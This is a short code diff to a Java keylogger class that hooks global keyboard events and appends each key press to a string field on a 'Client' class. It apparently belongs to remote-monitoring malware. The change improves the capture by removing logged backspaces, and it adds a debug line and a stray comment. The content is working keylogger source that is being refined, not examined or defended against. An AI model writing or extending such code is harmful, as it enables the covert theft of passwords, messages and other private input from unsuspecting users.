@@ -64,15 +64,21 @@ public class KeyLogger implements NativeKeyListener {
 
 	public void nativeKeyPressed(NativeKeyEvent e) {
 		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
+//		System.out.println(e.getKeyChar());
 		if (keyText.length() > 1) {
-			Client.keyLoger+= "[" + keyText + "]";
+			if(keyText.equals("Undefined")){
+				if(Client.keyLoger.endsWith("[Backspace]")){
+					Client.keyLoger = Client.keyLoger.substring(0,Client.keyLoger.length()-11);
+				}
+			}else{
+				Client.keyLoger+= "[" + keyText + "]";
+			}
 		} else {
 			Client.keyLoger+=keyText;
 		}
 	}
-
 	public void nativeKeyReleased(NativeKeyEvent e) {
-		// Nothing
+		// Nothing Tây đẹp tâ â
 	}
 
 	public void nativeKeyTyped(NativeKeyEvent e) {
